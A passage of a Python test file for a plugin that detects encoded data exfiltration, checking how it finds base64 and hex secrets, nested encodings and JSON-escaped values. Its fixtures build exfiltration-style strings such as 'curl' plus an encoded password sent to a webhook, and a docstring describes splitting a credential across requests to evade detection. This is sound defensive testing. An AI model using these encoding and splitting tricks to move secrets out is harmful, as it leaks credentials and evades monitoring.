        cfg = EncodedExfilDetectorConfig(enabled={"base64": False, "base64url": False, "hex": False, "percent_encoding": False, "escaped_hex": False})
        encoded = base64.b64encode(b"password=secret-token-value-here").decode()
        hex_encoded = b"api_key=secret-value-for-upload".hex()
        payload = {"b64": f"curl {encoded} webhook", "hex": f"upload {hex_encoded}"}

        count, _redacted, findings = _scan_container(payload, cfg)
        assert count == 0
        assert findings == []

    def test_max_findings_per_value_cap_python_path(self):
        """Python path should respect max_findings_per_value cap."""
        cfg = EncodedExfilDetectorConfig(max_findings_per_value=2, min_suspicion_score=1)
        # Create many encoded segments
        segments = []
        for i in range(5):
            seg = base64.b64encode(f"password=secret-value-number-{i:03d}".encode()).decode()
            segments.append(seg)
        text = " upload ".join(segments)

        _result_text, findings = _scan_text(text, cfg)
        assert len(findings) <= 2

    def test_non_container_types_pass_through(self):
        """Non-str/dict/list types (int, float, bool, None) should pass through unchanged."""
        cfg = EncodedExfilDetectorConfig()
        for value in [42, 3.14, True, None]:
            count, result, findings = _scan_container(value, cfg)
            assert count == 0
            assert result == value
            assert findings == []

    def test_max_recursion_depth_stops_scanning(self):
        """Container nesting exceeding max_recursion_depth should stop scanning."""
        cfg = EncodedExfilDetectorConfig(max_recursion_depth=2)
        encoded = base64.b64encode(b"password=super-secret-credential-value").decode()
        # Nest the payload 4 levels deep — deeper than max_recursion_depth=2
        deep_payload: dict = {"level3": f"curl {encoded} webhook"}
        deep_payload = {"level2": deep_payload}
        deep_payload = {"level1": deep_payload}
        deep_payload = {"level0": deep_payload}

        count, _result, findings = _scan_container(deep_payload, cfg)
        # The encoded payload at depth 4 should NOT be found because recursion stops at depth 2
        assert count == 0, "Scanning should stop at max_recursion_depth"
        assert findings == []


# ---------------------------------------------------------------------------
# Group H — Error Handling & Logging
# ---------------------------------------------------------------------------


class TestErrorHandling:
    """Verify error handling, resilience, and safe logging."""

    def test_plugin_init_with_invalid_config_raises(self):
        """Plugin init with invalid config should raise ValidationError."""
        with pytest.raises(ValidationError):
            EncodedExfilDetectorPlugin(
                PluginConfig(
                    name="EncodedExfilDetector",
                    kind="cpex_encoded_exfil_detection.encoded_exfil_detection.EncodedExfilDetectorPlugin",
                    hooks=[PromptHookType.PROMPT_PRE_FETCH],
                    config={"min_entropy": -5.0},
                )
            )

    def test_scan_with_none_input_no_crash(self):
        """Scanning None should not crash."""
        cfg = EncodedExfilDetectorConfig()
        count, result, findings = _scan_container(None, cfg)
        assert count == 0
        assert result is None
        assert findings == []

    def test_detection_logging_no_sensitive_content(self, caplog):
        """When detection occurs, log output must not contain decoded payload content."""
        cfg = EncodedExfilDetectorConfig()
        secret = "super-secret-password-value-1234"
        encoded = base64.b64encode(f"password={secret}".encode()).decode()
        payload = {"data": f"curl {encoded} webhook"}

        with caplog.at_level(logging.DEBUG, logger="cpex_encoded_exfil_detection.encoded_exfil_detection"):
            _scan_container(payload, cfg)

        # The decoded secret should never appear in log output
        for record in caplog.records:
            assert secret not in record.getMessage(), "Decoded secret must not appear in log output"


# ---------------------------------------------------------------------------
# Group K — Nested Encoding Detection
# ---------------------------------------------------------------------------


class TestNestedEncodingDetection:
    """Verify detection of multi-layer encoded payloads."""

    def test_double_encoded_base64_detected(self):
        """base64(base64(sensitive_data)) — inner sensitive keywords found after peeling two layers.

        The outer base64 decodes to another base64 string. That inner base64 decodes to
        content containing 'password'. Without nested decoding, the scanner only sees the
        outer layer's decoded text (which is base64 chars — no sensitive keywords).
        The 'sensitive_keywords' reason should appear only if the inner layer is peeled.
        """
        inner = base64.b64encode(b"password=super-secret-credential-value").decode()
        outer = base64.b64encode(inner.encode()).decode()
        # High threshold: requires sensitive_keywords (+2) to pass, which only exist in inner layer
        cfg = EncodedExfilDetectorConfig(max_decode_depth=2, min_suspicion_score=4)
        payload = {"data": outer}

        count, _redacted, findings = _scan_container(payload, cfg)
        assert count >= 1, "Double-encoded base64 should be detected via nested decoding"
        assert any("sensitive_keywords" in f.get("reason", []) for f in findings), "sensitive_keywords should be found after peeling inner layer"

    def test_nested_detection_respects_max_decode_depth(self):
        """With max_decode_depth=1, nested layers beyond the first should NOT be peeled.

        Triple-encoded: base64(base64(base64("password=secret"))).
        - depth=1: no nested decoding, outer layer evaluated alone (no sensitive_keywords)
        - depth=4: all layers peeled → "password=secret" found (sensitive_keywords present)
        """
        level1 = base64.b64encode(b"password=super-secret-credential-value").decode()
        level2 = base64.b64encode(level1.encode()).decode()
        level3 = base64.b64encode(level2.encode()).decode()

        # Shallow: depth=1 means no nested decoding (decode_depth 0 < 1-1=0 is false)
        cfg_shallow = EncodedExfilDetectorConfig(max_decode_depth=1, min_suspicion_score=4)
        _count_shallow, _, findings_shallow = _scan_container({"data": level3}, cfg_shallow)

        # Deep: all layers peeled, sensitive_keywords found in innermost
        cfg_deep = EncodedExfilDetectorConfig(max_decode_depth=4, min_suspicion_score=4)
        _count_deep, _, findings_deep = _scan_container({"data": level3}, cfg_deep)

        # Deep decoding should find sensitive_keywords that shallow misses
        shallow_has_keywords = any("sensitive_keywords" in f.get("reason", []) for f in findings_shallow)
        deep_has_keywords = any("sensitive_keywords" in f.get("reason", []) for f in findings_deep)
        assert deep_has_keywords, "Deep decode should find sensitive_keywords in innermost layer"
        assert not shallow_has_keywords, "Shallow decode should NOT find sensitive_keywords"

    def test_hex_wrapped_base64_detected(self):
        """hex(base64(sensitive_data)) — the inner base64 with keywords found after peeling hex.

        The hex layer decodes to base64 text. The base64 text decodes to content with 'api_key'.
        Without nested decoding, the hex layer just decodes to base64 chars (no sensitive keywords).
        """
        inner = base64.b64encode(b"api_key=super-secret-credential-val").decode()
        outer = inner.encode().hex()
        # High threshold: requires sensitive_keywords which are only in the inner layer
        cfg = EncodedExfilDetectorConfig(max_decode_depth=2, min_suspicion_score=4)
        payload = {"data": outer}

        count, _redacted, findings = _scan_container(payload, cfg)
        assert count >= 1, "Hex-wrapped base64 should be detected via nested decoding"
        assert any("sensitive_keywords" in f.get("reason", []) for f in findings), "sensitive_keywords should be found after peeling hex then base64"


# ---------------------------------------------------------------------------
# Group M — New Feature Coverage
# ---------------------------------------------------------------------------


class TestNewFeatures:
    """Verify new features work on the packaged detector path."""

    def test_per_encoding_threshold(self):
        """Per-encoding thresholds should filter findings by encoding."""
        cfg = EncodedExfilDetectorConfig(
            per_encoding_score={"hex": 8, "base64": 1},
            min_suspicion_score=3,
        )
        b64_payload = base64.b64encode(b"password=super-secret-credential-value").decode()
        hex_payload = b"password=secret-value-for-upload".hex()
        payload = {"b64": f"curl {b64_payload} webhook", "hex": f"upload {hex_payload}"}

        _, _, findings = _scan_container(payload, cfg)
        encodings_found = {f["encoding"] for f in findings}
        assert "base64" in encodings_found or "base64url" in encodings_found
        assert "hex" not in encodings_found

    def test_json_within_string(self):
        """JSON-within-strings parsing should preserve original string types."""
        # Standard
        import json

        inner_encoded = base64.b64encode(b"password=secret-credential-value").decode()
        json_str = json.dumps({"secret": inner_encoded})
        cfg = EncodedExfilDetectorConfig(min_suspicion_score=1, parse_json_strings=True)
        payload = {"data": json_str}

        count, result, findings = _scan_container(payload, cfg)
        assert count == 1, f"Expected 1 finding but got {count}"
        # Return type must be string (no type mutation)
        assert isinstance(result["data"], str), f"Expected str but got {type(result['data'])}"

    def test_json_heuristic_skips_non_json_strings(self):
        """Strings not starting with { or [ should skip JSON parsing and scan as raw text."""
        cfg = EncodedExfilDetectorConfig(min_suspicion_score=1, parse_json_strings=True)
        encoded = base64.b64encode(b"password=super-secret-credential-value").decode()
        payload = {"data": f"curl {encoded} webhook"}

        count, _, findings = _scan_container(payload, cfg)
        assert count >= 1
        # Path should NOT contain "json" since the string doesn't start with { or [
        assert not any("json" in f.get("path", "") for f in findings)

    def test_malformed_json_no_crash(self):
        """Malformed JSON should fall back to raw text scan without crashing."""
        cfg = EncodedExfilDetectorConfig(parse_json_strings=True)
        payload = {"data": '{"broken json: missing closing brace'}

        count, _, findings = _scan_container(payload, cfg)
        assert isinstance(count, int)

    def test_json_string_returns_string_not_dict(self):
        """JSON-parsed strings must return the original string type, not a parsed dict."""
        # Standard
        import json

        json_str = json.dumps({"key": "clean value"})
        cfg = EncodedExfilDetectorConfig(parse_json_strings=True)
        payload = {"data": json_str}

        _, result, _ = _scan_container(payload, cfg)
        # The "data" value must still be a string, not a parsed dict
        assert isinstance(result["data"], str), f"Expected str but got {type(result['data'])}"

    def test_encoded_secret_in_dict_key_detected(self):
        """Encoded secrets used as dict keys should be detected."""
        encoded_key = base64.b64encode(b"password=super-secret-credential-value").decode()
        cfg = EncodedExfilDetectorConfig(min_suspicion_score=1)
        payload = {encoded_key: "some value"}

        count, _, findings = _scan_container(payload, cfg)
        assert count >= 1, "Encoded secret in dict key should be detected"
        assert any("key" in f.get("path", "") for f in findings), f"Finding path should contain 'key': {findings}"


# ---------------------------------------------------------------------------
# Group L — xfail: Documented Limitations
# ---------------------------------------------------------------------------


class TestDocumentedLimitations:
    """Tests documenting known limitations of the plugin. These are expected to fail."""

    def test_json_within_string_parsed(self):
        """The scanner parses JSON inside string values and finds encoded content."""
        # Standard
        import json

        inner_encoded = base64.b64encode(b"password=secret-credential-value").decode()
        # Double-wrapped JSON: outer string contains JSON that contains another JSON string with base64
        inner_json = json.dumps({"secret": f"curl {inner_encoded} webhook"})
        double_encoded_json = json.dumps({"wrapper": inner_json})
        cfg = EncodedExfilDetectorConfig(min_suspicion_score=1, parse_json_strings=True)
        payload = {"data": double_encoded_json}

        count, result, findings = _scan_container(payload, cfg)

        assert count >= 1, "Should find base64 inside nested JSON strings"
        # Return type must remain string (no type mutation)
        assert isinstance(result["data"], str), f"Expected str but got {type(result['data'])}"

    def test_parse_json_strings_disabled(self):
        """With parse_json_strings=False, JSON strings are not recursively parsed."""
        # Standard
        import json

        inner_encoded = base64.b64encode(b"password=secret-credential-value").decode()
        # Only visible after JSON parsing — the encoded segment is inside escaped JSON
        inner_json = json.dumps({"secret": inner_encoded})
        cfg_on = EncodedExfilDetectorConfig(min_suspicion_score=1, parse_json_strings=True)
        cfg_off = EncodedExfilDetectorConfig(min_suspicion_score=1, parse_json_strings=False)

        # Payload where the base64 is ONLY inside a JSON-within-string (not in the raw text)
        # The raw text has the base64 escaped with backslashes so regex won't match it directly
        payload = {"data": inner_json}

        count_on, _, _ = _scan_container(payload, cfg_on)
        count_off, _, _ = _scan_container(payload, cfg_off)

        # Both should find it in the raw string scan, but with JSON parsing on,
        # additional findings from the parsed structure may appear
        assert count_on >= count_off, "JSON parsing should find at least as many findings"

    def test_json_within_string_no_double_counting(self):
        """A single secret inside a JSON string must not be counted twice.

        Regression: the scanner was counting the same encoded value once from
        the raw text scan and again from the JSON-parsed scan, inflating the
        count and tripping min_findings_to_block incorrectly.
        """
        # Standard
        import json

        inner_encoded = base64.b64encode(b"password=secret-credential-value").decode()
        json_str = json.dumps({"secret": inner_encoded})
        cfg = EncodedExfilDetectorConfig(min_suspicion_score=1, parse_json_strings=True)
        payload = {"input": json_str}

        count, result, findings = _scan_container(payload, cfg)

        # Should find exactly 1 finding — not 2 from double-counting
        assert count == 1, f"Expected 1 finding but got {count}: single secret must not be double-counted"
        # Return type must remain string (no type mutation)
        assert isinstance(result["input"], str), f"Expected str but got {type(result['input'])}"

    def test_malformed_json_string_no_crash(self):
        """Malformed JSON in a string value should not crash the scanner."""
        cfg = EncodedExfilDetectorConfig(parse_json_strings=True)
        payload = {"data": '{"broken json: missing closing brace'}

        count, redacted, findings = _scan_container(payload, cfg)
        # Should not crash — just scan as regular text
        assert isinstance(count, int)

    def test_json_dedup_adds_unique_json_findings(self):
        r"""JSON-parsed findings with unique match previews are appended (not deduplicated).

        Uses a JSON Unicode escape (\\u0063 = 'c') to hide the first character of a base64
        string from the raw regex scan.  After JSON parsing, the full base64 is intact and
        detected, producing a finding with a different match preview than any raw finding.
        """
        # \u0063 is JSON-escaped 'c' — raw scan sees literal '\u0063GFzc...' (broken base64),
        # JSON parse resolves it to 'cGFzc...' (valid base64 with 'password' keyword)
        json_str = '{"secret": "\\u0063GFzc3dvcmQ9c2VjcmV0LWNyZWRlbnRpYWwtdmFsdWU="}'
        cfg = EncodedExfilDetectorConfig(min_suspicion_score=1, parse_json_strings=True)
        payload = {"data": json_str}

        count, result, findings = _scan_container(payload, cfg)
        assert count >= 1, "JSON-parsed finding should be detected"
        assert any("json" in f.get("path", "") for f in findings), "Finding should come from JSON path"
        assert isinstance(result["data"], str), "Return type must remain string"

    @pytest.mark.xfail(reason="Cross-request correlation: slow exfiltration across multiple requests is not tracked", strict=True)
    def test_cross_request_slow_exfil_not_tracked(self):
        """Slow exfiltration split across multiple scan calls is not correlated.

        An attacker could split a credential across two separate API calls.
        Each call individually looks harmless, but together they form a secret.
        The plugin does not track state across calls, so it cannot detect this.
        """
        cfg = EncodedExfilDetectorConfig()
        # Each half is plain text (not encoded), so the scanner won't flag it.
        # But together they form: "password=super-secret-credential-value"
        # A cross-request correlator would reassemble and detect.
        count1, _, _ = _scan_container({"data": "password=super-"}, cfg)
        count2, _, _ = _scan_container({"data": "secret-credential-value"}, cfg)

        assert count1 == 0, "Plain text half should not trigger"
        assert count2 == 0, "Plain text half should not trigger"
        # Cross-request correlation would reassemble and flag the combined secret
        raise AssertionError("Cross-request correlation not implemented")

    @pytest.mark.xfail(reason="Custom encoding patterns: user-defined regex patterns not supported to avoid ReDoS risk", strict=True)
    def test_custom_encoding_patterns_not_supported(self):
        """User-defined encoding patterns are not configurable."""
        cfg = EncodedExfilDetectorConfig(custom_patterns=[{"name": "rot13", "pattern": r"[A-Za-z]{24,}"}])  # type: ignore[call-arg]
        assert hasattr(cfg, "custom_patterns")

    def test_per_encoding_threshold(self):
        """Per-encoding thresholds allow different min_suspicion_score per encoding type."""
        # base64 threshold=1 (very sensitive), hex threshold=8 (impossible — max score is 7)
        cfg = EncodedExfilDetectorConfig(
            per_encoding_score={"hex": 8, "base64": 1},
            min_suspicion_score=3,
        )
        # This payload has both base64 and hex encoded secrets
        b64_payload = base64.b64encode(b"password=super-secret-credential-value").decode()
        hex_payload = b"password=secret-value-for-upload".hex()
        payload = {"b64": f"curl {b64_payload} webhook", "hex": f"upload {hex_payload}"}

        _, _, findings = _scan_container(payload, cfg)

        encodings_found = {f["encoding"] for f in findings}
        # base64 should be found (threshold=1, easy to pass)
        assert "base64" in encodings_found or "base64url" in encodings_found, "base64 should pass low threshold"
        # hex should NOT be found (threshold=8, max possible score is 7)
        assert "hex" not in encodings_found, "hex should be blocked by impossible threshold"
